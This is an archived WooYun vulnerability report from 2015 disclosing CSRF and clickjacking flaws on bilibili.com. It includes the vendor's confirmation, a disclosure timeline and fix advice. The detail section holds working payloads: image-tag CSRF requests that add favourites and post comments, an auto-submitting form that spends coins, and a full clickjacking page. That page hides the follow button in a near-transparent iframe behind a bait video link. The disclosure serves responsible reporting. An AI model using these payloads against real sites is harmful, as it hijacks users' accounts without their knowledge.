{"id": 80326, "wybug_id": "wooyun-2015-0156134", "wybug_title": "Bilibili 多处 CSRF 及点击劫持", "wybug_corp": "bilibili.com", "wybug_author": "TYPCN", "wybug_date": "2015-11-26 17:44", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 祖传刷粉刷硬币刷收藏 详细说明：  刷收藏：\n<img src=\"http://api.bilibili.com/favourite/add?fav_box=0&id=视频ID\">\n刷评论：\n<img src=\"http://interface.bilibili.com/feedback/post?aid=AV号&action=send&quoteID=&msg=评论内容\">\n刷硬币（放在 HTTPS 地址下）：\n<form action=\"http://www.bilibili.com/plus/comment.php\" method=\"post\" target=\"_blank\">\t<input value=\"视频AV号\" name=\"aid\">\t<input value=\"100\" name=\"rating\">    <input name=\"multiply\" value=\"1\">    <input name=\"player\" value=\"1\"></form><script>document.querySelector('form').submit();</script>\n点击刷粉 POC（一个不透明度0.01的iframe，计算好关注按钮的位置，JS让关注按钮跟着鼠标跑，鼠标没有移出网页但是触发了window blur 事件则为用户点击了按钮）：\n<html><head>  <meta charset=\"UTF-8\">  <title>测试</title>  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head><body><style>body{margin:0px;padding:0px;}</style><div style=\"overflow:hidden;width:100px;height:100px;position:relative;\" id=\"v\">\t<iframe id=\"cksl7\" name=\"cksl7\" src=\"http://space.bilibili.com/目标用户ID\" style=\"border:0px;left:-381px;top:-166px;position:absolute;filter:alpha(opacity=0.01);z-index:1;opacity:0.01;overflow:hidden;width:1536px;height:914px;\"></iframe></div><script>var d=document;if(!d.all)d.captureEvents(Event.MOUSEMOVE);d.onmousemove=function(e){var i=d.getElementById(\"v\").style;i.left=d.all?event.clientX+d.body.scrollLeft:e.pageX;i.top=d.all?event.clientY+d.body.scrollTop:e.pageY;};</script><a href=\"＃\">页面载入中，请稍后</a><script>window.onload = function(){\tdocument.querySelector('a').innerHTML='点击在线观看网络高清搞比利';}window.onblur = function(){\tdocument.querySelector('a').innerHTML='感谢关注'}</script></body></html>\n   漏洞证明：  同上   修复方案：  跨站：限制 Referrer ，加 CSRF Token 等各种办法点击劫持：判断是否在 iframe 中，如果是的话点击按钮之后弹出一个 alert 确认一下   版权声明：转载请注明来源 TYPCN@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-11-26 18:30 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}